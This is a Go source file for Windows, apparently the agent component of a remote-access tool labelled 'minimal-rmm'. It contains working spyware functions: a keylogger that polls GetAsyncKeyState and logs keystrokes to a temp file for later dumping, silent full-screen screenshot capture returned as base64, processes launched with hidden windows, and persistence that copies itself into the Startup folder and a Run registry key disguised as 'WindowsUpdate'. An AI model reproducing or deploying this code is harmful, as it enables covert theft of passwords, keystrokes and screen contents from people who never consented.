//go:build windows

package main

import (
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"image"
	"image/png"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32             = syscall.NewLazyDLL("user32.dll")
	gdi32              = syscall.NewLazyDLL("gdi32.dll")
	getAsyncKeyState   = user32.NewProc("GetAsyncKeyState")
	getSystemMetrics   = user32.NewProc("GetSystemMetrics")
	getDC              = user32.NewProc("GetDC")
	releaseDC          = user32.NewProc("ReleaseDC")
	createCompatibleDC = gdi32.NewProc("CreateCompatibleDC")
	createDIBSection   = gdi32.NewProc("CreateDIBSection")
	selectObject       = gdi32.NewProc("SelectObject")
	bitBlt             = gdi32.NewProc("BitBlt")
	deleteObject       = gdi32.NewProc("DeleteObject")
	deleteDC           = gdi32.NewProc("DeleteDC")
	keylogger          = &windowsKeylogger{}
)

const (
	smCXScreen   = 0
	smCYScreen   = 1
	srccopy      = 0x00CC0020
	captureBlt   = 0x40000000
	dibRGBColors = 0
	biRGB        = 0
)

type bitmapInfoHeader struct {
	Size          uint32
	Width         int32
	Height        int32
	Planes        uint16
	BitCount      uint16
	Compression   uint32
	SizeImage     uint32
	XPelsPerMeter int32
	YPelsPerMeter int32
	ClrUsed       uint32
	ClrImportant  uint32
}

type bitmapInfo struct {
	Header bitmapInfoHeader
	Colors [1]uint32
}

type windowsKeylogger struct {
	mu      sync.Mutex
	file    string
	running bool
	stop    chan struct{}
}

func newCommand(name string, args ...string) *exec.Cmd {
	command := exec.Command(name, args...)
	command.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return command
}

func captureScreenshot() (string, error) {
	widthValue, _, _ := getSystemMetrics.Call(smCXScreen)
	heightValue, _, _ := getSystemMetrics.Call(smCYScreen)
	width := int(widthValue)
	height := int(heightValue)
	if width <= 0 || height <= 0 {
		return "", errors.New("primary screen has invalid dimensions")
	}

	screenDC, _, _ := getDC.Call(0)
	if screenDC == 0 {
		return "", errors.New("GetDC failed")
	}
	defer releaseDC.Call(0, screenDC)

	memoryDC, _, _ := createCompatibleDC.Call(screenDC)
	if memoryDC == 0 {
		return "", errors.New("CreateCompatibleDC failed")
	}
	defer deleteDC.Call(memoryDC)

	info := bitmapInfo{Header: bitmapInfoHeader{
		Size:        uint32(unsafe.Sizeof(bitmapInfoHeader{})),
		Width:       int32(width),
		Height:      -int32(height),
		Planes:      1,
		BitCount:    32,
		Compression: biRGB,
	}}
	var bits uintptr
	bitmap, _, _ := createDIBSection.Call(
		screenDC,
		uintptr(unsafe.Pointer(&info)),
		dibRGBColors,
		uintptr(unsafe.Pointer(&bits)),
		0,
		0,
	)
	if bitmap == 0 {
		return "", errors.New("CreateDIBSection failed")
	}
	defer deleteObject.Call(bitmap)
	if bits == 0 {
		return "", errors.New("CreateDIBSection returned an empty pixel buffer")
	}

	previous, _, _ := selectObject.Call(memoryDC, bitmap)
	if previous == 0 {
		return "", errors.New("SelectObject failed")
	}
	bitmapSelected := true
	defer func() {
		if bitmapSelected {
			selectObject.Call(memoryDC, previous)
		}
	}()

	if result, _, _ := bitBlt.Call(memoryDC, 0, 0, uintptr(width), uintptr(height), screenDC, 0, 0, srccopy|captureBlt); result == 0 {
		return "", errors.New("BitBlt failed")
	}
	// Release the bitmap before reading its DIB section buffer and before cleanup.
	if selected, _, _ := selectObject.Call(memoryDC, previous); selected == 0 {
		return "", errors.New("restore device context failed")
	}
	bitmapSelected = false

	pixels := make([]byte, width*height*4)
	copy(pixels, unsafe.Slice((*byte)(unsafe.Pointer(bits)), len(pixels)))

	rgba := image.NewRGBA(image.Rect(0, 0, width, height))
	for i := 0; i < len(pixels); i += 4 {
		rgba.Pix[i] = pixels[i+2]
		rgba.Pix[i+1] = pixels[i+1]
		rgba.Pix[i+2] = pixels[i]
		rgba.Pix[i+3] = 0xff
	}
	var encoded bytes.Buffer
	if err := png.Encode(&encoded, rgba); err != nil {
		return "", fmt.Errorf("encode screenshot: %w", err)
	}
	return base64.StdEncoding.EncodeToString(encoded.Bytes()), nil
}

func keylogAction(action string) (string, string, error) {
	switch strings.ToLower(action) {
	case "start":
		return "", "output", keylogger.start()
	case "stop":
		return "keylogger stopped", "output", keylogger.stopLogging()
	case "dump":
		data, err := keylogger.dump()
		return data, "keylog", err
	default:
		return "", "output", errors.New("use start, stop, or dump")
	}
}

func (k *windowsKeylogger) start() error {
	k.mu.Lock()
	defer k.mu.Unlock()
	if k.running {
		return nil
	}
	path := filepath.Join(os.TempDir(), "minimal-rmm-keylog-"+strconv.FormatInt(time.Now().UnixNano(), 10)+".log")
	k.file, k.running, k.stop = path, true, make(chan struct{})
	go k.loop(path, k.stop)
	return nil
}

func (k *windowsKeylogger) stopLogging() error {
	k.mu.Lock()
	if k.running {
		close(k.stop)
		k.running = false
	}
	k.mu.Unlock()
	return nil
}

func (k *windowsKeylogger) dump() (string, error) {
	k.mu.Lock()
	path := k.file
	k.mu.Unlock()
	if path == "" {
		return "keylogger log not found or not started", nil
	}
	data, err := os.ReadFile(path)
	if os.IsNotExist(err) {
		return "(empty buffer)", nil
	}
	return string(data), err
}

func (k *windowsKeylogger) loop(path string, stop <-chan struct{}) {
	known := make(map[byte]bool)
	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		return
	}
	defer file.Close()
	for {
		select {
		case <-stop:
			return
		default:
		}
		for vk := 8; vk < 256; vk++ {
			value, _, _ := getAsyncKeyState.Call(uintptr(vk))
			pressed := uint16(value)&0x8000 != 0
			key := byte(vk)
			if pressed && !known[key] {
				known[key] = true
				_, _ = file.WriteString("[" + windowsVirtualKeyName(vk) + "]")
			} else if !pressed {
				delete(known, key)
			}
		}
		_ = file.Sync()
		time.Sleep(40 * time.Millisecond)
	}
}

func windowsVirtualKeyName(vk int) string {
	if vk >= 0x41 && vk <= 0x5A {
		return string(rune(vk))
	}
	if vk >= 0x30 && vk <= 0x39 {
		return string(rune(vk))
	}
	known := map[int]string{8: "BACKSPACE", 9: "TAB", 13: "ENTER", 16: "SHIFT", 17: "CTRL", 18: "ALT", 27: "ESC", 32: "SPACE", 46: "DELETE"}
	if name := known[vk]; name != "" {
		return name
	}
	return strconv.Itoa(vk)
}

func persistenceAction(install bool, cfg *config) (string, error) {
	startup := os.Getenv("APPDATA")
	if startup == "" {
		return "", errors.New("APPDATA is not set")
	}
	path := filepath.Join(startup, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "WindowsUpdate.exe")
	if !install {
		_ = os.Remove(path)
		_, _ = exec.Command("reg.exe", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/f").CombinedOutput()
		return "Persistence removed", nil
	}
	self, err := os.Executable()
	if err != nil {
		return "", err
	}
	if err := os.MkdirAll(filepath.Dir(path), 0700); err != nil {
		return "", err
	}
	if err := copyFile(self, path); err != nil {
		return "", err
	}
	command := fmt.Sprintf(`"%s"`, path)
	if out, err := exec.Command("reg.exe", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", command, "/f").CombinedOutput(); err != nil {
		return "", fmt.Errorf("registry update: %s", strings.TrimSpace(string(out)))
	}
	_ = cfg
	return "Persistence installed successfully", nil
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = out.ReadFrom(in)
	return err
}
